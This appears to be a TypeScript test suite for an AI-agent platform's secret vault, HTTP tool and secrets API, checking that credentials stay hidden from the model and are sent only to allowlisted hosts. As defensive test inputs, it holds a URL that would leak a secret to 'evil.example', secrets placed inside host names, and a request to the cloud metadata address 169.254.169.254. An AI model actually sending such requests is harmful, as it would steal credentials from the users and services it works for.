import { AIMessage, HumanMessage, ToolMessage } from "@langchain/core/messages";
import { tool } from "@langchain/core/tools";
import { describe, expect, it } from "vitest";
import { z } from "zod";
import type { McpConnector } from "@osiris/core/mcp/toolset.ts";
import { SecretBox } from "@osiris/core/secrets.ts";
import { hostAllowed, redact, templateHost } from "@osiris/core/vault/template.ts";
import { SecretVault } from "@osiris/core/vault/vault.ts";
import { createTestDb, createTestProjects, createTestApp } from "./helpers.ts";

const run = (user: string, role: "admin" | "member" = "member") => ({
  configurable: { thread_id: `t-${user}`, project_id: "acme", user_id: user, role, channel: "web" as const },
});

describe("secret templates", () => {
  it("matches hosts, keeps secrets out of the host and redacts values", () => {
    expect(hostAllowed("api.fakturoid.cz", ["api.fakturoid.cz"])).toBe(true);
    expect(hostAllowed("eu.api.example.com", ["*.example.com"])).toBe(true);
    expect(hostAllowed("example.com", ["*.example.com"])).toBe(false);
    expect(hostAllowed("evilexample.com", ["*.example.com"])).toBe(false);
    expect(templateHost("https://api.x.cz/v1?key={{secret:K}}")).toBe("api.x.cz");
    expect(() => templateHost("https://{{secret:K}}.evil.com/")).toThrow(/URL's domain/);
    expect(() => templateHost("https://api.x.cz@{{secret:K}}/")).toThrow();
    expect(redact("token abcd1234 ok", ["abcd1234"])).toBe("token [skryto] ok");
  });
});

describe("SecretVault", () => {
  it("stores values sealed, lists without values and fills only for allowed hosts", async () => {
    const db = await createTestDb();
    const vault = new SecretVault(db, SecretBox.insecureDev());
    await vault.put("CRM_TOKEN", "", { value: "project-tok", allowedHosts: ["crm.example.com"], description: "CRM" });
    await vault.put("CRM_TOKEN", "alice", { value: "alice-tok", allowedHosts: ["crm.example.com"], description: "" });

    const raw = await db.execute("SELECT value_enc FROM secrets");
    expect(raw.rows.map((r) => String(r.value_enc)).join()).not.toMatch(/tok/);
    expect(JSON.stringify(await vault.list("alice"))).not.toContain("alice-tok");

    const t = { h: "Bearer {{secret:CRM_TOKEN}}" };
    expect((await vault.fill(t, { userId: "alice", host: "crm.example.com" })).filled.h).toBe("Bearer alice-tok");
    expect((await vault.fill(t, { userId: "bob", host: "crm.example.com" })).filled.h).toBe("Bearer project-tok");
    expect((await vault.fill(t, { userId: "", host: "crm.example.com" })).filled.h).toBe("Bearer project-tok");
    await expect(vault.fill(t, { userId: "alice", host: "evil.com" })).rejects.toThrow(/isn't allowed/);
    await expect(vault.fill({ h: "{{secret:NOPE}}" }, { userId: "alice", host: "crm.example.com" })).rejects.toThrow(/doesn't exist/);

    await vault.put("CRM_TOKEN", "", { allowedHosts: ["crm2.example.com"], description: "CRM" });
    expect((await vault.fill(t, { userId: "", host: "crm2.example.com" })).filled.h).toBe("Bearer project-tok");
    await expect(vault.put("NEW", "", { allowedHosts: ["a.cz"], description: "" })).rejects.toThrow(/needs a value/);
  });
});

describe("http_request tool", () => {
  function setup(response = "ok") {
    const requests: { url: string; headers: Record<string, string>; redirect?: string }[] = [];
    const fakeFetch = (async (url: string | URL, init?: RequestInit) => {
      requests.push({ url: String(url), headers: init?.headers as Record<string, string>, redirect: init?.redirect });
      return new Response(response, { status: 200, headers: { "content-type": "application/json" } });
    }) as typeof fetch;
    return { requests, fakeFetch };
  }

  it("fills secrets on the server, masks them in the result and never shows them to the model", async () => {
    const { requests, fakeFetch } = setup('{"echo":"Bearer s3cr3t-value"}');
    const call = { id: "h1", name: "http_request", args: { url: "https://api.fakturoid.cz/v3/invoices", headers: { Authorization: "Bearer {{secret:FAKTUROID}}" } } };
    const { projects, model } = createTestProjects([new AIMessage({ content: "", tool_calls: [call] }), new AIMessage("Hotovo.")], [], undefined, {
      fetch: fakeFetch,
      mcp: { allowPrivate: true },
    });
    const project = await projects.get("acme");
    await project.secrets.put("FAKTUROID", "", { value: "s3cr3t-value", allowedHosts: ["api.fakturoid.cz"], description: "Fakturoid API" });

    const state = await project.graph.invoke({ messages: [new HumanMessage("Faktury?")] }, run("u"));

    expect(requests[0]).toMatchObject({ url: "https://api.fakturoid.cz/v3/invoices", redirect: "manual", headers: { Authorization: "Bearer s3cr3t-value" } });
    const result = state.messages.find((m) => ToolMessage.isInstance(m))?.text ?? "";
    expect(result).toContain("HTTP 200");
    expect(result).not.toContain("s3cr3t-value");
    const prompt = model.calls[0]?.[0]?.text ?? "";
    expect(prompt).toContain("{{secret:FAKTUROID}} pro api.fakturoid.cz: Fakturoid API");
    expect(JSON.stringify(model.calls)).not.toContain("s3cr3t-value");
  });

  it("refuses to send a secret to another host and blocks private addresses", async () => {
    const { requests, fakeFetch } = setup();
    const { projects } = createTestProjects([], [], undefined, { fetch: fakeFetch });
    const project = await projects.get("acme");
    await project.secrets.put("FAKTUROID", "", { value: "s3cr3t-value", allowedHosts: ["api.fakturoid.cz"], description: "" });
    const http = (await import("@osiris/core/agent/tools/http.ts")).httpRequestTool(project.secrets, { fetch: fakeFetch });
    const invoke = (args: { url: string }) => http.invoke(args, run("u"));

    expect(await invoke({ url: "https://evil.example/collect?t={{secret:FAKTUROID}}" })).toMatch(/zamítnut.*isn't allowed/);
    expect(await invoke({ url: "https://169.254.169.254/latest/meta-data" })).toMatch(/zamítnut.*private network/);
    expect(await invoke({ url: "http://93.184.215.14/" })).toMatch(/zamítnut.*https/);
    expect(requests).toEqual([]);
  });
});

describe("secrets in MCP servers", () => {
  it("fills headers when connecting", async () => {
    const seen: Record<string, Record<string, string>> = {};
    const connect: McpConnector = async ({ name, headers }) => {
      seen[name] = headers;
      const t = tool(async () => "ok", { name: `${name}_ping`, description: "ping", schema: z.object({}) });
      return { tools: [t], close: async () => {} };
    };
    const { projects } = createTestProjects([], [], connect);
    const project = await projects.get("acme");
    await project.secrets.put("CRM", "", { value: "project-crm", allowedHosts: ["crm.example.com"], description: "" });
    await project.mcpServers.put("crm", "", { url: "https://crm.example.com/mcp", enabled: true, headers: { Authorization: "Bearer {{secret:CRM}}" } });
    await project.mcpServers.put("leak", "", { url: "https://cal.example.com/mcp", enabled: true, headers: { Authorization: "{{secret:CRM}}" } });
    await project.mcpServers.put("gone", "", { url: "https://crm.example.com/mcp", enabled: true, headers: { Authorization: "{{secret:MISSING}}" } });

    expect((await project.mcp.tools("alice")).map((t) => t.name)).toEqual(["crm_ping"]);
    expect(seen).toEqual({ crm: { Authorization: "Bearer project-crm" } });
    expect(project.mcp.status("").get("gone")).toEqual({ ok: false, error: "Secret MISSING doesn't exist." });
    expect(project.mcp.status("").get("leak")?.ok).toBe(false);
  });
});

describe("secrets API", () => {
  async function setup() {
    const { projects } = createTestProjects();
    const app = await createTestApp(projects);
    const as = (user: string) => (path: string, init: RequestInit = {}) =>
      app.request(`/api${path}`, { ...init, headers: { authorization: `Bearer ${user}`, "content-type": "application/json" } });
    return { as };
  }
  const put = (body: object) => ({ method: "PUT", body: JSON.stringify({ allowedHosts: ["api.example.com"], scope: "project", ...body }) });

  it("never returns values, lets only admins manage the project's and everyone keep their own", async () => {
    const { as } = await setup();
    const admin = as("alice:project-admin=acme");
    const member = as("bob:project=acme");

    expect((await member("/secrets/CRM", put({ value: "x" }))).status).toBe(403);
    expect((await admin("/secrets/crm", put({ value: "x" }))).status).toBe(400);
    expect((await admin("/secrets/CRM", put({ value: "x", allowedHosts: [] }))).status).toBe(400);
    expect((await admin("/secrets/CRM", put({ value: "x", allowedHosts: ["https://api.example.com/"] }))).status).toBe(400);
    expect((await admin("/secrets/CRM", put({ value: "project-value-1", description: "CRM" }))).status).toBe(204);

    const listed = await (await member("/secrets")).text();
    expect(listed).not.toMatch(/value-1/);
    expect(JSON.parse(listed)).toMatchObject([{ name: "CRM", scope: "project", allowedHosts: ["api.example.com"], description: "CRM" }]);
    expect((await member("/secrets/CRM?scope=project", { method: "DELETE" })).status).toBe(403);

    // Bob's own key of the same name replaces the project's for him.
    expect((await member("/secrets/CRM", put({ value: "bob-value", scope: "personal" }))).status).toBe(204);
    expect(await (await member("/secrets")).json()).toMatchObject([
      { name: "CRM", scope: "project", overridden: true },
      { name: "CRM", scope: "personal" },
    ]);
    expect(await (await admin("/secrets")).json()).toMatchObject([{ name: "CRM", scope: "project" }]);
    expect((await member("/secrets/CRM?scope=personal", { method: "DELETE" })).status).toBe(204);
    expect((await admin("/secrets/CRM?scope=project", { method: "DELETE" })).status).toBe(204);
  });

  it("rejects MCP URLs with a secret in the host", async () => {
    const { as } = await setup();
    const res = await as("alice:project-admin=acme")("/mcp-servers/x", {
      method: "PUT",
      body: JSON.stringify({ url: "https://{{secret:CRM}}.example.com/mcp", scope: "project" }),
    });
    expect(res.status).toBe(400);
  });
});
